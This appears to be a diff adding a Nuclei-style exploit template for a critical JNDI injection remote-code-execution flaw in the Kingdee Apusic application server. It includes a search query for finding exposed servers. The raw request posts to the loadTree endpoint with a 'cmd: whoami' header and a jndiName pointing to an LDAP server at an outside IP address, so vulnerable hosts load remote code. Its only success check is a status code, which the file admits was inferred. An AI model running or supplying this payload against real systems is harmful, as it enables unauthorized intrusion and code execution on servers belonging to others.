@@ -1,0 +1,38 @@
+id: poc-5284aef2115613a41d73
+info:
+  name: 金蝶Apusic应用服务器(中间件)loadTreeJNDI注入漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/5284aef2115613a41d73e22366e7ac3f
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 5284aef2115613a41d73e22366e7ac3f
+    fofa: + hunter`app.name="Apusic 金蝶天燕 Server"&&web.title=="Welcome to Apusic Application Server"`
+http:
+- raw:
+  - 'POST /appmonitor//protect/jndi/loadTree HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Content-type: application/x-www-form-urlencoded
+
+    Content-Length: 32
+
+    cmd: whoami
+
+    Connection: close
+
+
+    jndiName=ldap://172.245.154.22:1389/zdsghu'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
